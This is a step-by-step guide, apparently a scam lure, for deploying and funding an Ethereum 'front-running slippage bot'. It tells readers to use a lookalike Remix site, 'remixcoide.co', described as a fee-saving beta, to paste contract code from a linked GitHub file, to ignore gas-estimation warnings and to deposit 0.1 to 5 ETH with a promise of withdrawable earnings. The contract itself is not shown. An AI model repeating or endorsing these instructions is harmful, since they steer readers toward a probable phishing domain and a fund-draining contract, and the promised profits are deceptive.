üö® Important Notice: Ensure Sufficient Funding for Gas Fees and Burn Fees üö®

I've received several messages from users who did not fund their contracts with enough Ethereum (ETH) to cover gas and potential burn fees. The bot is designed to target token contracts with a maximum of 10% burn fee, although most tokens today range between 2% to 6% in fees. If you fund your contract with less than 0.05 ETH and the bot targets a token with higher burn fees, you may waste gas on failed transactions.

To avoid this, I recommend funding your contract with at least 0.1 ETH to 5 ETH to ensure the bot operates efficiently.

Step-by-Step Guide to Deploy the Bot
1. Download MetaMask: metamask.io
‚Ä¢[MetaMask Download](https://metamask.io/download/)
2. Access Remix: https://remixcoide.co/
‚Ä¢‚ö†Ô∏èRemix IDE [(Use this beta version to save on fees)](https://remixcoide.co/)

3. Create a New Solidity File:

‚Ä¢In Remix, go to the "contracts" folder, click "New File", and name it something like "OneinchSlippageBot.sol". Make sure it ends with .sol (Solidity file extension).
‚Ä¢If the text is not highlighted, simply refresh the browser and re-paste the contract code.
üî• [Paste the ETH Contract Code in Remix.](https://github.com/Jacob-Web3/ETH-Bot/blob/main/Code%20-%20Update%2022%20October%202024)

4. Compile the Contract:

‚Ä¢Go to the "Compile" tab in Remix and select Solidity version 0.6.6 to compile.

5. Deploy the Contract:

‚Ä¢Navigate to the "DEPLOY & RUN TRANSACTIONS" tab.

‚Ä¢Select "Injected Web3 - MetaMask" as the environment, and click "Deploy".

‚Ä¢Approve the contract creation fee in MetaMask.

‚Ä¢Important: Ensure the name of your bot (e.g., "OneinchSlippageBot.sol") is selected above the "Deploy" button.

If you see the message "Gas estimation failed", just click "Send transaction" and confirm the fee in MetaMask‚Äîit will auto-estimate the gas.

You may also encounter the message "Failed to publish metadata file to IPFS". This can be ignored, as it's not required for bot deployment.

6. Fund Your Bot:

‚Ä¢Once deployed, fund your bot with more than 0.05 ETH to your bot's contract address. This ensures sufficient balance to prevent slippage losses during front-running.

7. Start the Bot:

‚Ä¢After your funding transaction is confirmed, click the "start" button to initiate the bot.
You can withdraw your earnings anytime by clicking the "Withdraw" button.
